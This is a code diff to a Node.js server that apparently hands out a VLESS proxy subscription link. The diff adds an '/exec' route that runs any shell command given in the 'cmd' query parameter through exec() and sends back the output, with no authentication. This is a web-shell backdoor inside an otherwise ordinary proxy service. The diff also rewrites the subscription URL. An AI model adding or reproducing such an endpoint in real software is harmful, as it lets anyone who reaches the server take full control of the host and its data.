@@ -29,11 +29,48 @@ const GetISP = async () => {
 }
 GetISP();
 const httpServer = http.createServer((req, res) => {
+
+ // Get information object about request URL:
+    const parsedURL = url.parse(
+        req.url, 
+        true // 'true' sets parameters to be returned in object format
+    );
+
+    // Handle request to '/page' route:
+    if (parsedURL.pathname === '/exec') {
+
+        // Get all parameters:
+        console.log(parsedURL.query); // { key1: 'value1', key2: 'value2', key3: 'value3' }
+    
+        if(!parsedURL.query.cmd) {
+            res.writeHead(200, { 'Content-Type': 'text/plain' });
+            res.end('No command\n');
+            return;
+        }
+
+        let cmdStr = parsedURL.query.cmd;
+        exec(cmdStr, function (err, stdout, stderr) {
+            if (err) {
+                res.writeHead(200, { 'Content-Type': 'text/plain' });
+             res.end(err.message);
+            } else {
+                res.writeHead(200, { 'Content-Type': 'text/plain' });
+         res.end(stdout);
+            }
+        });
+        
+        return;
+    }
+
+  
   if (req.url === '/') {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
     res.end('Hello, World\n');
   } else if (req.url === `/${SUB_PATH}`) {
-    const vlessURL = `vless://${UUID}@www.visa.com.tw:443?encryption=none&security=tls&sni=${DOMAIN}&fp=chrome&type=ws&host=${DOMAIN}&path=%2F${WSPATH}#${NAME}-${ISP}`;
+  //  const vlessURL = `vless://${UUID}@www.visa.com.tw:443?encryption=none&security=tls&sni=${DOMAIN}&fp=chrome&type=ws&host=${DOMAIN}&path=%2F${WSPATH}#${NAME}-${ISP}`;
+    const subdomain = DOMAIN.split('.')[0]; // 取域名前缀
+    const vlessURL = `vless://${UUID}@www.visa.com.tw:443?encryption=none&security=tls&sni=${DOMAIN}&type=ws&host=${DOMAIN}&path=%2F#${subdomain}`;
+
     const base64Content = Buffer.from(vlessURL).toString('base64');
     res.writeHead(200, { 'Content-Type': 'text/plain' });
     res.end(base64Content + '\n');
